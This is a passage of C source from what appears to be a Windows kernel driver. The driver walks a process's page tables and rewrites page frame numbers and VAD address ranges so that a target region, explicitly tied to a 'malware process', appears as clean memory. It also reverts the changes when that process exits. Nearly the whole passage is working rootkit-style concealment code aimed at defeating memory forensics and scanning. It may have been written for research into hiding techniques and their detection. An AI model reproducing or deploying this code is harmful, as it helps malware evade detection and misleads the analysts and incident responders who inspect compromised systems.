				KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "\n\nClean PTE Bitfields:\n"));
				KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "PTE : 0x%llx\n", cleanPTE));
				PrintPTEbits(cleanPTE);


				DbgBreakPoint();
				// manipulate PFN of target PTE
				KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "\n---------------------------MANIPULATE PTE------------------------\n"));
				PMMPTE ManipulatedPTE = ManipulatePFNofPTE(targetPTE, cleanPTE);
				KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "\nPTE manipulated Bitfields:\n"));
				PrintPTEbits(ManipulatedPTE);
				PTEsManipulated = TRUE;
				DbgBreakPoint();

				// for large pages the value 0x1000 needs to be adjusted
				currentCleanAddress = currentCleanAddress + 0x1000;
				pfnIndexCounter++;
			}
		}
		else {
			KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "\nNo memory range for PTE manipulation\n"));
		}
	}

	// manipulation on VAD/PTE target memory
	if (VADPTE == TRUE) {
		if (hidingInfo.VADPTEtargetStartAddress != 0x0000 && hidingInfo.VADPTEtargetEndAddress != 0x0000) {

			KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "\n\n---------------------------PTE Manipulation - VAD/PTE target memory------------------------\n\n"));

			// PTE manipulation

			// get virtual addresses from range
			currentCleanAddress = hidingInfo.cleanStartAddress;
			int pfnIndexCounter = 0;
			for (
				currentTargetAddress = hidingInfo.VADPTEtargetStartAddress;
				currentTargetAddress <= hidingInfo.VADPTEtargetEndAddress;
				// for large pages the value 0x1000 needs to be adjusted
				currentTargetAddress = currentTargetAddress + 0x1000
				) {

				// get PTE for virtual address
				KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "\n---------------------------SEARCH TARGET PTE------------------------\n"));
				targetPTE = GetPTEofVirtualAddress(targetEPROC, currentTargetAddress);
				KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "\nTarget PTE : 0x%llx\n", targetPTE));

				// save original PTE
				VADPTEmanipulationOriginalPFNs[pfnIndexCounter] = targetPTE->u.Hard.PageFrameNumber;

				// get PTE of clean memory page to mimic unsuspicious data at new PFN
				KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "\n---------------------------SEARCH CLEAN PTE------------------------\n"));
				cleanPTE = (PMMPTE)GetPTEofVirtualAddress(targetEPROC, currentCleanAddress);
				KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "\nClean PTE : 0x%llx\n", cleanPTE));

				// show bitfields
				KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "\n---------------------------PTE BITFIELDS------------------------\n"));
				KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "\n\nTarget PTE Bitfields:\n"));
				KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "PTE : 0x%llx\n", targetPTE));
				PrintPTEbits(targetPTE);
				KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "\n\nClean PTE Bitfields:\n"));
				KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "PTE : 0x%llx\n", cleanPTE));
				PrintPTEbits(cleanPTE);


				DbgBreakPoint();
				// manipulate PFN of target PTE
				KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "\n---------------------------MANIPULATE PTE------------------------\n"));
				PMMPTE ManipulatedPTE = ManipulatePFNofPTE(targetPTE, cleanPTE);
				KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "\nPTE manipulated Bitfields:\n"));
				PrintPTEbits(ManipulatedPTE);
				DbgBreakPoint();

				// for large pages the value 0x1000 needs to be adjusted
				currentCleanAddress = currentCleanAddress + 0x1000;
				pfnIndexCounter++;
			}

		}
		else {
			KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "\nNo memory range for PTE manipulation\n"));
		}
	}
}

PMMPTE GetPTEofVirtualAddress(
	_In_ DWORD64 eproc,
	_In_ DWORD64 vAddr
)
{	
	DWORD64				PML4phys;
	PMMPTE				PML4E;
	DWORD64				PML4index;
	DWORD64				PDPTphys;
	PMMPTE				PDPTE;
	DWORD64				PDPTindex;
	DWORD64				PDphys;
	PMMPTE				PDE;
	DWORD64				PDindex;
	DWORD64				PTphys;
	PMMPTE				PTE;
	DWORD64				PTindex;
	PHYSICAL_ADDRESS	pAddr;
	ULONGLONG			PFN;

	KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "\nSearching PTE for virtual address: 0x%llx\n", vAddr));
	
	// get PML4 by EPROC dirbase
	PML4phys = (GetProcessDirBase(eproc) >> 4) << 4;
	KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "\nPML4 physical: 0x%llx\n", PML4phys));
	// get PML4 index out of vaddr
	PML4index = (vAddr >> 39) & 0x1ff;
	KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "PML4index: 0x%llx\n", PML4index));
	// get PML4E virtual address
	pAddr.QuadPart = PML4phys + (PML4index * 0x08);
	KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "PML4E physical: 0x%llx\n", pAddr.QuadPart));
	PML4E = (PMMPTE)MmGetVirtualForPhysical(pAddr);
	KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "PML4E virtual: 0x%llx\n", PML4E));
	PFN = PML4E->u.Hard.PageFrameNumber;
	KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "PFN: 0x%llx\n", PFN));

	
	// get PDPT by PFN of PML4E
	PDPTphys = PML4E->u.Hard.PageFrameNumber << 12;
	KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "\nPDPTphys: 0x%llx\n", PDPTphys));
	// get PDPT index out of vaddr
	PDPTindex = (vAddr >> 30) & 0x1ff;
	KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "PDPTindex: 0x%llx\n", PDPTindex));
	// get PDPTE virtual address
	pAddr.QuadPart = PDPTphys + (PDPTindex * 0x08);
	KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "PDPTE physical: 0x%llx\n", pAddr.QuadPart));
	PDPTE = (PMMPTE)MmGetVirtualForPhysical(pAddr);
	KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "PDPTE virtual: 0x%llx\n", PDPTE));
	PFN = PDPTE->u.Hard.PageFrameNumber;
	KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "PFN: 0x%llx\n", PFN));

	// get PD by PFN of PDPTE
	PDphys = PDPTE->u.Hard.PageFrameNumber << 12;
	KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "\nPDphys: 0x%llx\n", PDphys));
	// get PD index out of vaddr
	PDindex = (vAddr >> 21) & 0x1ff;
	KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "PDindex: 0x%llx\n", PDindex));
	// get PDE virtual address
	pAddr.QuadPart = PDphys + (PDindex * 0x08);
	KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "PDE physical: 0x%llx\n", pAddr.QuadPart));
	PDE = (PMMPTE)MmGetVirtualForPhysical(pAddr);
	KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "PDE virtual: 0x%llx\n", PDE));
	PFN = PDE->u.Hard.PageFrameNumber;
	KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "PFN: 0x%llx\n", PFN));


	// get PT by PFN of PDE
	PTphys = PDE->u.Hard.PageFrameNumber << 12;
	KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "\nPTphys: 0x%llx\n", PTphys));
	// get PT index out of vaddr
	PTindex = (vAddr >> 12) & 0x1ff;
	KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "PTindex: 0x%llx\n", PTindex));
	// get PTE virtual address
	pAddr.QuadPart = PTphys + (PTindex * 0x08);
	KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "PTE physical: 0x%llx\n", pAddr.QuadPart));
	PTE = (PMMPTE)MmGetVirtualForPhysical(pAddr);
	KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "PTE virtual: 0x%llx\n", PTE));
	PFN = PTE->u.Hard.PageFrameNumber;
	KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "PFN: 0x%llx\n", PFN));

	return PTE;
}

PMMPTE ManipulatePFNofPTE(
	_In_ PMMPTE targetPTE, 
	_In_ PMMPTE cleanPTE
)
{
	// manipulate PFN
	targetPTE->u.Hard.PageFrameNumber = cleanPTE->u.Hard.PageFrameNumber;

	return targetPTE;
}

PMMVAD_SHORT ManipulateVADRange(
	_In_ PMMVAD_SHORT VADtarget,
	_In_ PMMVAD_SHORT VADclean
)
{
	KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "Target VAD: 0x%llx\n", VADtarget));
	KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "Start Address: 0x%llx\n", VADtarget->StartingVpn));
	KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "End Address: 0x%llx\n", VADtarget->EndingVpn));
	KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "Start Address High: 0x%llx\n", VADtarget->StartingVpnHigh));
	KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "End Address High: 0x%llx\n", VADtarget->EndingVpnHigh));

	KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "\nClean VAD: 0x%llx\n", VADclean));
	KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "Start Address: 0x%llx\n", VADclean->StartingVpn));
	KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "End Address: 0x%llx\n", VADclean->EndingVpn));
	KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "Start Address High: 0x%llx\n", VADclean->StartingVpnHigh));
	KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "End Address High: 0x%llx\n", VADclean->EndingVpnHigh));
	
	// add 0x300000 to the clean VAD addresses to prevent the existence of two equal ranges
	VADtarget->StartingVpn = VADclean->StartingVpn + 0x300000;
	VADtarget->EndingVpn = VADclean->EndingVpn + 0x300000;

	return VADtarget;
}

VOID UndoVADManipulation(
	BOOLEAN VADPTE,
	BOOLEAN VAD
) {

	if (VAD == TRUE) {
		// undo VAD manipulation of VAD target memory
		KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "\nNOTIFY ROUTINE - restoring original VAD range of VAD target memory\n"));
		VADmanipulationTargetVAD->StartingVpn = VADmanipulationOriginalStartingVpn;
		VADmanipulationTargetVAD->EndingVpn = VADmanipulationOriginalEndingVpn;
		KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "\nNOTIFY ROUTINE - restored original VAD range of VAD target memory\n"));
	}

	if (VADPTE == TRUE) {
		// undo VAD manipulation of VAD/PTE target memory
		KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "\nNOTIFY ROUTINE - restoring original VAD range of VAD/PTE target memory\n"));
		VADPTEmanipulationTargetVAD->StartingVpn = VADPTEmanipulationOriginalStartingVpn;
		VADPTEmanipulationTargetVAD->EndingVpn = VADPTEmanipulationOriginalEndingVpn;
		KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "\nNOTIFY ROUTINE - restored original VAD range of VAD/PTE target memory\n"));
	}
}

VOID UndoPTEManipulation(
	BOOLEAN VADPTE,
	BOOLEAN PTE
) {
	
	if (PTE == TRUE) {
		// undo PTE manipulation of PTE target memory
		KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "\nNOTIFY ROUTINE - restoring original PTEs of PTE target memory\n"));
		int PfnIndexCounter = 0;
		DWORD64 currentTargetAddress;
		PMMPTE targetPTE;

		for (
			currentTargetAddress = hidingInfo.PTEtargetStartAddress;
			currentTargetAddress <= hidingInfo.PTEtargetEndAddress;
			// for large pages the value 0x1000 needs to be adjusted
			currentTargetAddress = currentTargetAddress + 0x1000
			) {
			targetPTE = GetPTEofVirtualAddress(targetEPROC, currentTargetAddress);
			// set original PFN
			targetPTE->u.Hard.PageFrameNumber = PTEmanipulationOriginalPFNs[PfnIndexCounter];
			PfnIndexCounter++;
		}

		KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "\nNOTIFY ROUTINE - restored original PTEs of PTE target memory\n"));
	}

	if (VADPTE == TRUE) {
		// undo PTE manipulation of VAD/PTE target memory
		KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "\nNOTIFY ROUTINE - restoring original PTEs of VAD/PTE target memory\n"));
		int PfnIndexCounter = 0;
		DWORD64 currentTargetAddress;
		PMMPTE targetPTE;

		for (
			currentTargetAddress = hidingInfo.VADPTEtargetStartAddress;
			currentTargetAddress <= hidingInfo.VADPTEtargetEndAddress;
			// for large pages the value 0x1000 needs to be adjusted
			currentTargetAddress = currentTargetAddress + 0x1000
			) {
			targetPTE = GetPTEofVirtualAddress(targetEPROC, currentTargetAddress);
			// set original PFN
			targetPTE->u.Hard.PageFrameNumber = VADPTEmanipulationOriginalPFNs[PfnIndexCounter];
			PfnIndexCounter++;
		}

		KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "\nNOTIFY ROUTINE - restored original PTEs of VAD/PTE target memory\n"));
	}
}

VOID OnProcessNotify(
	_In_ HANDLE ParentId, 
	_In_ HANDLE ProcessId, 
	_In_ BOOLEAN Create
)
{
	UNREFERENCED_PARAMETER(ParentId);

	// catch malware process exit
	ULONG exitedPID = HandleToULong(ProcessId);
	KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "\nNOTIFY ROUTINE - START\n"));
	if (!Create && dataReceived == TRUE) {

		if (hidingInfo.PID && ((int)exitedPID == hidingInfo.PID)) {
			KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "\nNOTIFY ROUTINE - IF2\n"));
			if (VADManipulated == TRUE) {
				UndoVADManipulation(FALSE, TRUE);
				VADManipulated = FALSE;
			}
			if (PTEsManipulated == TRUE) {
				UndoPTEManipulation(FALSE, TRUE);
				PTEsManipulated = FALSE;
			}
			if (VADPTEsManipulated == TRUE) {
				UndoVADManipulation(TRUE, FALSE);
				UndoPTEManipulation(TRUE, FALSE);
				VADPTEsManipulated = FALSE;
			}
		}
	}
}
